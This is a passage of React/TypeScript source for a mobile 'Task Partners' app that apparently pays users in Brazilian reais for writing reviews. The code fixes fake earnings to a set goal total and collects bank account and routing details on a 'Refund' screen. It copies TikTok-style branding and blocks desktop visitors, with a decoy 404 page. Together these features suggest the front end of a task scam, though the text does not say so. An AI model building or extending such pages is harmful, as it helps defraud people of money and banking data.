        {(reviews.length ? reviews : [{ date: "Today", title: "No reviews yet", reward: 0, status: "Waiting" }]).map((review, index) => (
          <div key={`${review.title}-${index}`} className="rounded-[8px] border border-slate-200 bg-white p-3 text-sm shadow-sm">
            <div className="flex items-center justify-between gap-3 font-black"><span>{review.title}</span><span>{brl(review.reward)}</span></div>
            <div className="mt-1 flex items-center justify-between text-xs font-bold text-[#475569]"><span>{review.date}</span><span>{review.status}</span></div>
          </div>
        ))}
      </div>
    </div>
  );
}

function BottomNav({ screen, setScreen }: { screen: Screen; setScreen: (screen: Screen) => void }) {
  return (
    <nav className="shrink-0 border-t border-slate-200 bg-white px-2 pb-[max(8px,env(safe-area-inset-bottom))] pt-2 text-[11px] font-black shadow-[0_-8px_24px_rgba(15,23,42,.08)]">
      <div className="grid grid-cols-4">
        <NavButton active={screen === "tasks"} icon={<Home size={21} />} label="Tasks" onClick={() => setScreen("tasks")} />
        <NavButton active={screen === "wallet"} icon={<Wallet size={21} />} label="Wallet" onClick={() => setScreen("wallet")} />
        <NavButton active={screen === "refund"} icon={<ReceiptText size={21} />} label="Refund" onClick={() => setScreen("refund")} />
        <NavButton active={screen === "profile"} icon={<UserRound size={21} />} label="Profile" onClick={() => setScreen("profile")} />
      </div>
    </nav>
  );
}

function ProcessingOverlay({ step }: { step: number }) {
  return (
    <div className="fixed inset-0 z-50 grid place-items-center bg-white/96 px-7 text-center text-[#0F172A]">
      <div className="w-full max-w-[340px]">
        <div className="mx-auto mb-7 grid h-20 w-20 place-items-center rounded-full bg-[#FE2C55] text-white shadow-xl shadow-rose-200">
          <Loader2 className="animate-spin" size={36} />
        </div>
        <p className="text-xs font-black uppercase tracking-[0.18em] text-[#2563EB]">Processing review</p>
        <h2 className="mt-3 text-2xl font-black">{processingSteps[step]}</h2>
      </div>
    </div>
  );
}

function ChoiceRow({ label, value, onChange }: { label: string; value: string; onChange: (value: string) => void }) {
  return (
    <div>
      <p className="mb-2 text-sm font-black text-[#0F172A]">{label}</p>
      <div className="grid grid-cols-2 gap-2">
        {["Yes", "No"].map((option) => (
          <button key={option} className={`h-11 rounded-[8px] text-sm font-black transition ${value === option ? "bg-[#FE2C55] text-white shadow-lg shadow-rose-100" : "bg-white text-[#475569]"}`} onClick={() => onChange(option)} onMouseDown={(event) => event.preventDefault()} type="button">
            {option}
          </button>
        ))}
      </div>
    </div>
  );
}

function NavButton({ active, icon, label, onClick }: { active: boolean; icon: ReactNode; label: string; onClick: () => void }) {
  return <button className={`flex h-14 flex-col items-center justify-center gap-1 rounded-[8px] ${active ? "bg-[#F1F5F9] text-[#FE2C55]" : "text-[#475569]"}`} onClick={onClick} type="button">{icon}<span>{label}</span></button>;
}

function AuthInput({
  icon,
  onChange,
  placeholder,
  type,
  value,
}: {
  icon: ReactNode;
  onChange: (value: string) => void;
  placeholder: string;
  type: string;
  value: string;
}) {
  return (
    <label className="flex h-13 items-center gap-3 rounded-[8px] border border-slate-200 bg-white px-4 text-[#0F172A] shadow-sm">
      {icon}
      <input
        required
        className="min-w-0 flex-1 bg-transparent text-sm font-bold outline-none placeholder:text-slate-400"
        onChange={(event) => onChange(event.target.value)}
        placeholder={placeholder}
        type={type}
        value={value}
      />
    </label>
  );
}

function MetricCard({ label, value, tone }: { label: string; value: string; tone: string }) {
  return <div className={`rounded-[8px] border border-slate-200 ${tone} p-4 shadow-sm`}><p className="text-xs font-black uppercase tracking-[0.16em] text-[#475569]">{label}</p><p className="mt-2 text-3xl font-black text-[#0F172A]">{value}</p></div>;
}

function Brand() {
  return <div className="flex items-center gap-2 text-lg font-black text-[#0F172A]"><span className="h-5 w-5 rounded-[6px] bg-[#25F4EE] shadow-[7px_0_0_#FE2C55]" /> Task Partners</div>;
}

function UnsupportedDevice() {
  return (
    <main className="grid min-h-dvh place-items-center bg-[#F8FAFC] px-6 text-center text-[#0F172A]">
      <div className="max-w-[420px] rounded-[8px] border border-slate-200 bg-white p-6 shadow-xl">
        <div className="mx-auto mb-4 grid h-14 w-14 place-items-center rounded-full bg-[#FE2C55] text-white">
          <LockKeyholeIcon size={26} />
        </div>
        <h1 className="text-2xl font-black">Unsupported Device</h1>
        <p className="mt-3 text-sm leading-6 text-[#475569]">
          This application is available only on mobile devices (iOS/Android). Please open it from your smartphone.
        </p>
      </div>
    </main>
  );
}

function Server404() {
  return <main className="grid min-h-dvh place-items-center bg-white text-center text-black"><div><h1 className="text-5xl font-black">404</h1><p className="mt-3 text-lg text-zinc-600">Not Found</p></div></main>;
}

function brl(value: number) {
  return value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

function rewardForTask(index: number): number {
  if (index === TOTAL_TASKS_TO_GOAL - 1) {
    const previousTotal = rewardCurve.slice(0, TOTAL_TASKS_TO_GOAL - 1).reduce((sum, value) => sum + value, 0);
    return Number((TOTAL_REWARD_TO_GOAL - previousTotal).toFixed(2));
  }
  return Number((rewardCurve[index] ?? 0).toFixed(2));
}

function countWords(value: string) {
  return value.trim().split(/\s+/).filter((word) => word.length > 1).length;
}

function readAccounts(): User[] {
  try {
    const raw = window.localStorage.getItem(ACCOUNTS_KEY);
    return raw ? (JSON.parse(raw) as User[]) : [];
  } catch {
    return [];
  }
}

function readSession(): User | null {
  try {
    const raw = window.localStorage.getItem(SESSION_KEY);
    return raw ? (JSON.parse(raw) as User) : null;
  } catch {
    return null;
  }
}

function readAppState(email: string): { balance: number; reviewedIds: string[]; reviews: Review[]; taskIndex: number } | null {
  try {
    const raw = window.localStorage.getItem(appStateKey(email));
    return raw ? (JSON.parse(raw) as { balance: number; reviewedIds: string[]; reviews: Review[]; taskIndex: number }) : null;
  } catch {
    return null;
  }
}

function appStateKey(email: string) {
  return `${APP_STATE_KEY}:${email.toLowerCase()}`;
}

type RefundState = {
  account: string;
  approved: boolean;
  bank: string;
  data: string;
  method: string;
  routing: string;
};

function readRefundState(email: string): RefundState | null {
  try {
    const raw = window.localStorage.getItem(refundStateKey(email));
    return raw ? (JSON.parse(raw) as RefundState) : null;
  } catch {
    return null;
  }
}

function refundStateKey(email: string) {
  return `${REFUND_STATE_KEY}:${email.toLowerCase()}`;
}
